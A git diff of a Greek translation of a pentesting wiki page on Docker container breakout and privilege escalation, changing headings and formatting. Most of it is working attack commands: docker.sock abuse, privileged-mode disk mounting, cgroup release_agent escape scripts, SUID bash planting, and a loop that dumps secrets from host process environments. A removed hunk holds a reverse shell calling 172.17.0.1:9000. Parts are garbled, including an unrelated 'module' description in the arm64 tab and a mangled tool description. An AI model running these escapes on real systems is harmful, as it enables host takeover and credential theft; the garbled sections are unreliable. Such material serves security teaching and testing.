@@ -1,4 +1,4 @@
-# Διαρροή / Ανόδου Προνομίων στο Docker
+# Docker Breakout / Privilege Escalation
 
 <details>
 
@@ -34,12 +34,15 @@
 
 Αν κάπως βρείτε ότι το **docker socket είναι συνδεδεμένο** μέσα στο docker container, θα μπορείτε να αποδράσετε από αυτό.\
 Αυτό συμβαίνει συνήθως σε docker containers που για κάποιο λόγο χρειάζεται να συνδεθεί στον docker daemon για να εκτελέσει ενέργειες.
+
 ```bash
 #Search the socket
 find / -name docker.sock 2>/dev/null
 #It's usually in /run/docker.sock
 ```
+
 Σε αυτήν την περίπτωση μπορείτε να χρησιμοποιήσετε τα κανονικά εντολές docker για να επικοινωνήσετε με τον docker daemon:
+
 ```bash
 #List images to use one
 docker images
@@ -53,6 +56,7 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 # Get full privs in container without --privileged
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
+
 {% hint style="info" %}
 Σε περίπτωση που το **docker socket βρίσκεται σε μη αναμενόμενη θέση** μπορείτε ακόμα να επικοινωνήσετε μαζί του χρησιμοποιώντας την εντολή **`docker`** με την παράμετρο **`-H unix:///path/to/docker.sock`**
 {% endhint %}
@@ -75,9 +79,11 @@ docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --se
 Θα πρέπει να ελέγξετε τις δυνατότητες του container, αν έχει οποιαδήποτε από τις παρακάτω, ενδέχεται να μπορείτε να δραπετεύσετε από αυτό: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
 
 Μπορείτε να ελέγξετε τις τρέχουσες δυνατότητες του container χρησιμοποιώντας τα **προηγουμένως αναφερθέντα αυτόματα εργαλεία** ή:
+
 ```bash
 capsh --print
 ```
+
 Στην ακόλουθη σελίδα μπορείτε **να μάθετε περισσότερα σχετικά με τις δυνατότητες του Linux** και πώς να τις καταχραστείτε για να δραπετεύσετε/εξελίξετε προνόμια:
 
 {% content-ref url="../../linux-capabilities.md" %}
@@ -109,17 +115,21 @@ capsh --print
 Με αυτές τις άδειες μπορείτε απλά **να μεταβείτε στο χώρο ονομάτων ενός διεργασίας που εκτελείται στον κεντρικό υπολογιστή ως ριζοχρήστης** όπως το init (pid:1) απλά εκτελώντας: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
 
 Δοκιμάστε το σε έναν ελεγκτή εκτελώντας:
+
 ```bash
 docker run --rm -it --pid=host --privileged ubuntu bash
 ```
+
 ### Προνομιούχος
 
 Απλά με τη σημαία προνομιούχου μπορείτε να προσπαθήσετε να **έχετε πρόσβαση στο δίσκο του υπολογιστή** ή να προσπαθήσετε να **δραπετεύσετε καταχρώμενοι το release\_agent ή άλλες διαφυγές**.
 
 Δοκιμάστε τις παρακάτω παρακάμψεις σε ένα container εκτελώντας:
+
 ```bash
 docker run --rm -it --privileged ubuntu bash
 ```
+
 #### Προσάρτηση Δίσκου - Poc1
 
 Οι ρυθμισμένες σωστά docker containers δεν θα επιτρέψουν εντολές όπως **fdisk -l**. Ωστόσο, σε docker εντολές που έχουν ρυθμιστεί λανθασμένα όπου ορίζεται η σημαία `--privileged` ή `--device=/dev/sda1` με κεφαλαία γράμματα, είναι δυνατόν να αποκτηθούν δικαιώματα για να δείτε τον δίσκο του κεντρικού υπολογιστή.
@@ -127,15 +137,18 @@ docker run --rm -it --privileged ubuntu bash
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
 Έτσι, για να πάρετε τον έλεγχο του κεντρικού υπολογιστή, είναι εύκολο:
+
 ```bash
 mkdir -p /mnt/hola
 mount /dev/sda1 /mnt/hola
 ```
+
 Και ορίστε! Τώρα μπορείτε να έχετε πρόσβαση στο σύστημα αρχείων του κεντρικού υπολογιστή επειδή είναι προσαρτημένο στον φάκελο `/mnt/hola`.
 
 #### Προσάρτηση Δίσκου - Poc2
 
 Μέσα στο container, ένας επιτιθέμενος μπορεί να προσπαθήσει να κερδίσει περαιτέρω πρόσβαση στο υποκείμενο λειτουργικό σύστημα του κεντρικού υπολογιστή μέσω ενός εγγράψιμου όγκου hostPath που δημιουργήθηκε από το cluster. Παρακάτω είναι μερικά κοινά πράγματα που μπορείτε να ελέγξετε μέσα στο container για να δείτε αν μπορείτε να εκμεταλλευτείτε αυτό το διάνυσμα του επιτιθέμενου:
+
 ```bash
 ### Check if You Can Write to a File-system
 echo 1 > /proc/sysrq-trigger
@@ -156,6 +169,7 @@ mount: /mnt: permission denied. ---> Failed! but if not, you may have access to 
 ### debugfs (Interactive File System Debugger)
 debugfs /dev/sda1
 ```
+
 #### Απόδραση με προνομιούχο χρήστη εκμεταλλευόμενος τον υπάρχοντα release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
 
 {% code title="Αρχικό PoC" %}
@@ -192,48 +206,6 @@ sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1
 # Reads the output
 cat /o
 ```
-#### Απόδραση με προνομιούχο ρόλο εκμεταλλευόμενος το δημιουργημένο release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
-```bash
-# On the host
-docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
-
-# Mounts the RDMA cgroup controller and create a child cgroup
-# This technique should work with the majority of cgroup controllers
-# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
-# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
-mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
-# If mount gives an error, this won't work, you need to use the first PoC
-
-# Enables cgroup notifications on release of the "x" cgroup
-echo 1 > /tmp/cgrp/x/notify_on_release
-
-# Finds path of OverlayFS mount for container
-# Unless the configuration explicitly exposes the mount point of the host filesystem
-# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
-host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
-
-# Sets release_agent to /path/payload
-echo "$host_path/cmd" > /tmp/cgrp/release_agent
-
-#For a normal PoC =================
-echo '#!/bin/sh' > /cmd
-echo "ps aux > $host_path/output" >> /cmd
-chmod a+x /cmd
-#===================================
-#Reverse shell
-echo '#!/bin/bash' > /cmd
-echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
-chmod a+x /cmd
-#===================================
-
-# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
-# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
-# The script on the host will execute after /bin/sh exits
-sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
-
-# Reads the output
-cat /output
-```
 {% endcode %}
 
 Βρείτε μια **εξήγηση της τεχνικής** στο:
@@ -249,6 +221,7 @@ cat /output
 {% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
 [release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
 {% endcontent-ref %}
+
 ```bash
 #!/bin/sh
 
@@ -308,7 +281,9 @@ sleep 1
 echo "Done! Output:"
 cat ${OUTPUT_PATH}
 ```
+
 Η εκτέλεση του PoC εντός ενός προνομιούχου container θα παρέχει έξοδο παρόμοια με:
+
 ```bash
 root@container:~$ ./release_agent_pid_brute.sh
 Checking pid 100
@@ -336,6 +311,7 @@ root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
 root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ...
 ```
+
 #### Απόδραση με Προνομιούχο Χρήστη Εκμεταλλευόμενος Ευαίσθητα Mounts
 
 Υπάρχουν αρκετά αρχεία που μπορεί να τοποθετηθούν που δίνουν **πληροφορίες σχετικά με τον υποκείμενο κεντρικό υπολογιστή**. Κάποια από αυτά μπορεί ακόμη να υποδεικνύουν **κάτι που πρόκειται να εκτελεστεί από τον κεντρικό υπολογιστή όταν συμβεί κάτι** (το οποίο θα επιτρέψει σε έναν επιτιθέμενο να δραπετεύσει από τον εμπλεκόμενο δοχείο).\
@@ -356,13 +332,16 @@ root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ### Αυθαίρετα Mounts
 
 Σε πολλές περιπτώσεις θα διαπιστώσετε ότι το **δοχείο έχει κάποιον όγκο που έχει τοποθετηθεί από τον κεντρικό υπολογιστή**. Εάν αυτός ο όγκος δεν έχει διαμορφωθεί σωστά, ενδέχεται να μπορείτε να **έχετε πρόσβαση/τροποποιήσετε ευαίσθητα δεδομένα**: Διαβάστε μυστικά, αλλάξτε τα authorized\_keys του ssh...
+
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
+
 ### Εscalation προνομίων με 2 κελύφη και host mount
 
 Εάν έχετε πρόσβαση ως **root μέσα σε ένα container** που έχει κάποιο φάκελο από τον host που έχει προσαρτηθεί και έχετε **δραπετεύσει ως μη προνομιούχος χρήστης στον host** και έχετε πρόσβαση ανάγνωσης στον προσαρτημένο φάκελο.\
 Μπορείτε να δημιουργήσετε ένα **αρχείο bash suid** στον **προσαρτημένο φάκελο** μέσα στο **container** και να το **εκτελέσετε από τον host** για προνομιούχα αύξηση.
+
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
 # You need to copy it from the host as the bash binaries might be diferent in the host and in the container
@@ -370,6 +349,7 @@ chown root:root bash #From container as root inside mounted folder
 chmod 4777 bash #From container as root inside mounted folder
 bash -p #From non priv inside mounted folder
 ```
+
 ### Εscalation προνομίων με 2 κελύφη
 
 Εάν έχετε πρόσβαση ως **root μέσα σε ένα container** και έχετε **δραπετεύσει ως μη προνομιούχος χρήστης στον host**, μπορείτε να καταχραστείτε και τα δύο κελύφη για **επέκταση προνομίων μέσα στον host** αν έχετε τη δυνατότητα MKNOD μέσα στο container (είναι προεπιλεγμένο) όπως [**εξηγείται σε αυτή την ανάρτηση**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
@@ -378,6 +358,7 @@ bash -p #From non priv inside mounted folder
 Το Docker προστατεύει ενάντια στην κατάχρηση αρχείων block device μέσα στα containers επιβάλλοντας μια πολιτική cgroup που **αποκλείει τις λειτουργίες ανάγνωσης/εγγραφής αρχείων block device**. Ωστόσο, εάν ένα αρχείο block device **δημιουργηθεί μέσα στο container**, γίνεται προσβάσιμο από έξω από το container μέσω του φακέλου **/proc/PID/root/**. Αυτή η πρόσβαση απαιτεί τον **ίδιο κάτοχο διεργασίας** τόσο μέσα όσο και έξω από το container.
 
 Παράδειγμα **εκμετάλλευσης** από αυτό το [**άρθρο**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
+
 ```bash
 # On the container as root
 cd /
@@ -413,15 +394,19 @@ augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_
 augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
 HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
 ```
+
 ### hostPID
 
 Εάν μπορείτε να έχετε πρόσβαση στις διεργασίες του κεντρικού υπολογιστή, τότε θα μπορείτε να έχετε πρόσβαση σε πολλές ευαίσθητες πληροφορίες που αποθηκεύονται σε αυτές τις διεργασίες. Εκτελέστε το εργαστήριο δοκιμών:
+
 ```
 docker run --rm -it --pid=host ubuntu bash
 ```
+
 Για παράδειγμα, θα μπορείτε να εμφανίσετε τις διεργασίες χρησιμοποιώντας κάτι σαν `ps auxn` και να αναζητήσετε ευαίσθητες λεπτομέρειες στις εντολές.
 
 Στη συνέχεια, καθώς μπορείτε **να έχετε πρόσβαση σε κάθε διεργασία του κεντρικού υπολογιστή στο /proc/, μπορείτε απλά να κλέψετε τα μυστικά περιβάλλοντός τους** εκτελώντας:
+
 ```bash
 for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
 /proc/988058/environ
@@ -430,7 +415,9 @@ HOSTNAME=argocd-server-69678b4f65-6mmql
 USER=abrgocd
 ...
 ```
+
 Μπορείτε επίσης **να έχετε πρόσβαση στους αριθμούς αρχείων άλλων διεργασιών και να διαβάσετε τα ανοικτά αρχεία τους**:
+
 ```bash
 for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
 less fds.txt
@@ -440,6 +427,7 @@ lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
 # You can open the secret filw with:
 cat /proc/635813/fd/4
 ```
+
 Μπορείτε επίσης **να τερματίσετε διεργασίες και να προκαλέσετε DoS**.
 
 {% hint style="warning" %}
@@ -447,9 +435,11 @@ cat /proc/635813/fd/4
 {% endhint %}
 
 ### hostNetwork
+
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
+
 Εάν ένας container έχει διαμορφωθεί με τον [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), το δίκτυο αυτού του container δεν είναι απομονωμένο από τον Docker host (το container μοιράζεται το namespace δικτύου του host) και το container δεν λαμβάνει ανατεθειμένη δική του διεύθυνση IP. Με άλλα λόγια, το **container δένει όλες τις υπηρεσίες απευθείας στη διεύθυνση IP του host**. Επιπλέον, το container μπορεί **να παρακολουθήσει ΟΛΗ την κίνηση δικτύου που ο host** στέλνει και λαμβάνει στην κοινόχρηστη διεπαφή `tcpdump -i eth0`.
 
 Για παράδειγμα, μπορείτε να χρησιμοποιήσετε αυτό για **να καταγράψετε και ακόμη να παραποιήσετε την κίνηση** μεταξύ του host και της μεταδεδομένης περίπτωσης.
@@ -462,9 +452,11 @@ docker run --rm -it --network=host ubuntu bash
 Θα μπορείτε επίσης να έχετε πρόσβαση σε **υπηρεσίες δικτύου που είναι δεμένες στο localhost** μέσα στον host ή ακόμη και να έχετε πρόσβαση στα **δικαιώματα μεταδεδομένων του κόμβου** (τα οποία ενδέχεται να είναι διαφορετικά από αυτά που μπορεί να έχει πρόσβαση ένα container).
 
 ### hostIPC
+
 ```bash
 docker run --rm -it --ipc=host ubuntu bash
 ```
+
 Με το `hostIPC=true`, κερδίζετε πρόσβαση στους πόρους μεταξύ διεργασιών (IPC) του κεντρικού υπολογιστή, όπως η **κοινόχρηστη μνήμη** στο `/dev/shm`. Αυτό επιτρέπει την ανάγνωση/εγγραφή όπου οι ίδιοι IPC πόροι χρησιμοποιούνται από άλλες διεργασίες του κεντρικού υπολογιστή ή των pods. Χρησιμοποιήστε την εντολή `ipcs` για να εξετάσετε αυτούς τους μηχανισμούς IPC περαιτέρω.
 
 * **Επιθεώρηση του /dev/shm** - Αναζητήστε αρχεία σε αυτήν την τοποθεσία της κοινόχρηστης μνήμης: `ls -la /dev/shm`
@@ -473,11 +465,13 @@ docker run --rm -it --ipc=host ubuntu bash
 ### Ανάκτηση δυνατοτήτων
 
 Αν η κλήση συστήματος **`unshare`** δεν έχει απαγορευτεί, μπορείτε να ανακτήσετε όλες τις δυνατότητες εκτελώντας:
+
 ```bash
 unshare -UrmCpf bash
 # Check them with
 cat /proc/self/status | grep CapEff
 ```
+
 ### Κατάχρηση του περιβάλλοντος χρήστη μέσω συμβολικών συνδέσεων
 
 Η δεύτερη τεχνική που εξηγείται στη δημοσίευση [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) δείχνει πώς μπορείτε να καταχραστείτε τα bind mounts με τα user namespaces, για να επηρεάσετε αρχεία μέσα στον κεντρικό υπολογιστή (σε εκείνη τη συγκεκριμένη περίπτωση, διαγράψτε αρχεία).
@@ -541,36 +535,36 @@ cat /proc/self/status | grep CapEff
 ```
 {% endtab %}
 
-{% tab title="arm64 syscalls" %} 
+{% tab title="arm64 syscalls" %}
+### Docker Breakout - Privilege Escalation
 
-## Docker Breakout - Privilege Escalation
-
-### Description
+#### Description
 
 This module attempts to escape from a Docker container to the Docker host by exploiting misconfigurations in the Docker daemon or vulnerabilities in the Linux kernel.
 
-### Usage
+#### Usage
 
 1. Compile the `docker-breakout.c` file on the target system using the provided Makefile.
 2. Run the compiled binary to attempt privilege escalation.
 
-### Detection
+#### Detection
 
 Monitor for any unauthorized access to the Docker host from within a container. Check for unusual processes or network activity that could indicate a breakout attempt.
 
-### Prevention
+#### Prevention
 
-- Keep Docker and the Linux kernel up to date to patch any known vulnerabilities.
-- Follow best practices for securing Docker configurations to minimize the risk of privilege escalation.
+* Keep Docker and the Linux kernel up to date to patch any known vulnerabilities.
+* Follow best practices for securing Docker configurations to minimize the risk of privilege escalation.
 
-### References
+#### References
 
-- [Docker Security](https://docs.docker.com/engine/security/security/)
-- [Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
+* [Docker Security](https://docs.docker.com/engine/security/security/)
+* [Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker\_Security\_Cheat\_Sheet.html)
 
-### Disclaimer
+#### Disclaimer
 
 This module is for educational purposes only. Do not use it for illegal activities.
+
 ```
 0x029 -- pivot_root
 0x059 -- acct
@@ -590,7 +584,9 @@ This module is for educational purposes only. Do not use it for illegal activiti
 ```
 {% endtab %}
 
-{% tab title="syscall_bf.c" %}Το syscall_bf.c είναι ένα εργαλείο που χρησιμοποιείται για την εκτέλεση επιθέσεων προνομιακής αύξησης στο Docker. Αυτό το εργαλείο εκμεταλλεϊεται μια ευπάθεια στον πυρήνα Linux που επιτρέπει σε χρήστες με προνομιακά δικαιώματα στον χώρο χρήστη να αποκτήσουν πρόσβαση σε προνομιακές λειτουργίες. Χρησιμοποιείται για την ανάπτυξη και την εκτέλεση επιθέσεων διαρροής προνομίων. %}
+{% tab title="syscall_bf.c" %}
+Το syscall\_bf.c είναι ένα εργαλείο που χρησιμοποιείται για την εκτέλεση επιθέσεων προνομιακής αύξησης στο Docker. Αυτό το εργαλείο εκμεταλλεϊεται μια ευπάθεια στον πυρήνα Linux που επιτρέπει σε χρήστες με προνομιακά δικαιώματα στον χώρο χρήστη να αποκτήσουν πρόσβαση σε προνομιακές λειτουργίες. Χρησιμοποιείται για την ανάπτυξη και την εκτέλεση επιθέσεων διαρροής προνομίων. %\}
+
 ````c
 // From a conversation I had with @arget131
 // Fir bfing syscalss in x64
